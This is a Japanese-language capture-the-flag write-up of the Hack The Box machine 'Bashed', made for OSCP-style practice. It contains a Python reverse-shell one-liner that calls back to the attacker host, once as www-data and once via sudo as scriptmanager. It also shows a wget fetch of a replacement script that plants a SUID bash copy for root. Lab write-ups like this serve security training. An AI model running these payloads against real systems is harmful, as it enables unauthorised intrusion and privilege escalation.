+++ 
draft = false
date = 2022-07-02T16:19:22+09:00
title = "HTB_Bashed_writeup"
description = "HTB_Bashed_writeup"
slug = ""
authors = []
tags = ["HackTheBox","OSCP"]
categories = ["Cyber Security"]
externalLink = ""
series = []
+++

# 【Hack The Box】 Bashed Writeup
## Information
- OS：Linux  
- 難易度：Easy  
- IPアドレス：10.129.100.143  
{{< figure src="/images/Bashed1.png" title="Screenshot" class="center" width="800">}}

## Recon
### autoreconでスキャンをし、80が空いていることがわかります。
```shell
└─# python3 autorecon.py 10.129.100.143
[*] Scanning target 10.129.100.143
[*] [10.129.100.143/all-tcp-ports] Discovered open port tcp/80 on 10.129.100.143
[*] [10.129.100.143/tcp/80/http/vhost-enum] The target was not a hostname, nor was a hostname provided as an option. Skipping virtual host enumeration.
[*] [10.129.100.143/tcp/80/http/known-security] [tcp/80/http/known-security] There did not appear to be a .well-known/security.txt file in the webroot (/).
[*] [10.129.100.143/tcp/80/http/curl-robots] [tcp/80/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).
```

### ブラウザでアクセスします。
{{< figure src="/images/Bashed2.png" title="Screenshot" class="center" width="800">}}

### gobusterで探索をします。
```shell
$ gobuster dir -u http://10.129.100.143 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.100.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/07 07:25:57 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://10.129.100.143/images/]
/uploads              (Status: 301) [Size: 318] [--> http://10.129.100.143/uploads/]
/php                  (Status: 301) [Size: 314] [--> http://10.129.100.143/php/]    
/css                  (Status: 301) [Size: 314] [--> http://10.129.100.143/css/]    
/dev                  (Status: 301) [Size: 314] [--> http://10.129.100.143/dev/]    
/js                   (Status: 301) [Size: 313] [--> http://10.129.100.143/js/]     
/fonts                (Status: 301) [Size: 316] [--> http://10.129.100.143/fonts/]
```

### /devにアクセスすると、ディレクトリリスティングされています。
{{< figure src="/images/Bashed3.png" title="Screenshot" class="center" width="800">}}

### phpbash.phpをクリックすると、シェルのようなプロンプトにアクセスできました。
{{< figure src="/images/Bashed4.png" title="Screenshot" class="center" width="800">}}

### ncからシェルに繋ぎます。pythonコードをターゲットマシンのプロンプトに入力します。
```shell
$ nc -lnvp 4444 
listening on [any] 4444 ...
```

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.114",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

### シェルが返ってきましたので、フラグを取ります。（フラグは省略しています）
```shell
$ nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.100.143] 48662
/bin/sh: 0: can't access tty; job control turned off
$
```

```shell
$ cat user.txt
2c2...
```

## 権限昇格
### sudo -lでパスワード不要でsudoできるコマンドのリストを表示します。scriptmanagerは全てのコマンドをsudoのパスワードなしで実行できます。
```shell
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### 以前に使用したものと同じPythonリバースシェルを、scriptmanagerとして再度使用します。
```shell
$ nc -lnvp 4445 
listening on [any] 4445 ...
```

```shell
sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.114",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

```shell
$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.100.143] 45882
/bin/sh: 0: can't access tty; job control turned off
$ whoami
scriptmanager
```

### scriptmanagerが所有するファイルとフォルダーを列挙します。/scripts/test.pyがありました。
```shell
$ find / -xdev -type f -user scriptmanager 2>/dev/null; find -xdev -type d -user scriptmanager 2>/dev/null
/scripts/test.py
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
```

### /scripts/test.pyの中身を見てみると、テキストファイルに文字列を書き込んでいるだけです。
```shell
$ cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

### bashのSUIDバイナリを作成するPythonスクリプトをローカルで作成します。
```shell
$ cat test.py                
import os
os.system('cp /bin/bash /tmp/stef; chmod +s /tmp/stef')
```

### HTTPサーバをサーブし、タッゲートマシンに転送します。
```shell
$ cd /scripts                                
$ ls
test.py
test.txt
$ wget http://10.10.14.114/test.py -O test.py
--2022-06-07 05:16:34--  http://10.10.14.114/test.py
Connecting to 10.10.14.114:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 66 [text/plain]
Saving to: 'test.py'

     0K                                                       100% 8.28M=0s

2022-06-07 05:16:35 (8.28 MB/s) - 'test.py' saved [66/66]

$ cat test.py
import os
os.system('cp /bin/bash /tmp/stef; chmod +s /tmp/stef')
$
```

### 数分待ち、/tmp/stef -pを実行するとrootが取れましたので、フラグを取得します。（フラグは省略しています）
```shell
$ /tmp/stef -p

whoami
root
```

```shell
cat root.txt
cc4...
```